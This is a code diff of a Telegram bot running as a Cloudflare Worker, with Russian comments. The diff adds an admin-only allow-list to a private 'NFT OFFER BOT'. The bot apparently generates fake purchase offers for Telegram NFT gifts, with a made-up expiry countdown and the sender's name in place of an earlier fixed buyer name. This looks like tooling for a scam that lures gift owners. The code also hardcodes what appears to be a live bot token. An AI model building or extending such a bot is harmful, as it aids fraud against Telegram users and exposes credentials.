@@ -1,5 +1,5 @@
 const ADMIN_ID = 5151757168; // Ваш ID
-const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew"; // Убедись, что тут полный токен!
+const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew"; // ВСТАВЬТЕ ВАШ ТОКЕН!
 
 export default {
   async fetch(request, env, ctx) {
@@ -14,24 +14,74 @@ export default {
       if (update.message && update.message.text === "/start") {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
+        const username = update.message.from.username;
 
-        // Временно пускаем всех
-        let text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;
+        // Сохраняем юзернейм в базу, чтобы вы могли добавлять по @username
+        if (username) {
+          await env.USERS_KV.put(`username:${username.toLowerCase()}`, userId.toString());
+        }
+
+        const isAdmin = userId === ADMIN_ID;
+        const isAllowed = await env.USERS_KV.get(`user:${userId}`);
+        
+        let text = "";
+        if (!isAdmin && !isAllowed) {
+          text = "🔒 <b>Доступ закрыт.</b>\n\nЭтот бот приватный.\nОбратитесь к владельцу (@gwrex).";
+        } else {
+          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;
+        }
 
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
+      }
+
+      // --- ОБРАБОТКА КОМАНДЫ /add (только для вас) ---
+      if (update.message && update.message.text.startsWith("/add ")) {
+        const senderId = update.message.from.id;
+        
+        if (senderId === ADMIN_ID) {
+          let target = update.message.text.split(" ")[1].trim();
+          
+          if (target.startsWith("@")) {
+            const uname = target.slice(1).toLowerCase();
+            const foundId = await env.USERS_KV.get(`username:${uname}`);
+            
+            if (foundId) {
+              await env.USERS_KV.put(`user:${foundId}`, "true");
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.` });
+            } else {
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден в базе.\n\nПопросите его нажать /start в боте, после чего вы сможете его добавить.` });
+            }
+          } else {
+            await env.USERS_KV.put(`user:${target}`, "true");
+            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.` });
+          }
+        }
       }
 
       // --- ОБРАБОТКА INLINE-ЗАПРОСОВ (@GarisOfferBot) ---
       if (update.inline_query) {
         const iq = update.inline_query;
+        const userId = iq.from.id;
         
+        const isAdmin = userId === ADMIN_ID;
+        const isAllowed = await env.USERS_KV.get(`user:${userId}`);
+
+        if (!isAdmin && !isAllowed) {
+            return new Response("OK", { status: 200 });
+        }
+
         const parts = iq.query.split(" ");
         if (parts.length >= 3) {
           const giftId = parts[0];
           const amount = parts[1];
           const currency = parts[2];
 
-          const text = `🎁 <b>${giftId}</b>\n\n👤 <b>GiftBuyer Redo</b> предлагает вам ${amount} ⭐ Stars за подарок ${giftId}.\n\nОффер действителен ещё 5 ч. 59 мин..`;
+          // БЕРЕМ ИМЯ ИЗ ПРОФИЛЯ ТЕЛЕГРАМ
+          let senderName = iq.from.first_name || "";
+          if (iq.from.last_name) senderName += " " + iq.from.last_name;
+          if (!senderName && iq.from.username) senderName = "@" + iq.from.username;
+
+          const text = `🎁 <b>${giftId}</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за подарок ${giftId}.\n\nОффер действителен ещё 5 ч. 59 мин..`;
 
           const results = [{
             type: "article",
@@ -77,7 +127,6 @@ export default {
 
       return new Response("OK", { status: 200 });
     } catch (error) {
-      // Если что-то упадет, мы увидим ошибку в логах
       console.error("ОШИБКА:", error.message);
       return new Response("Error: " + error.message, { status: 500 });
     }
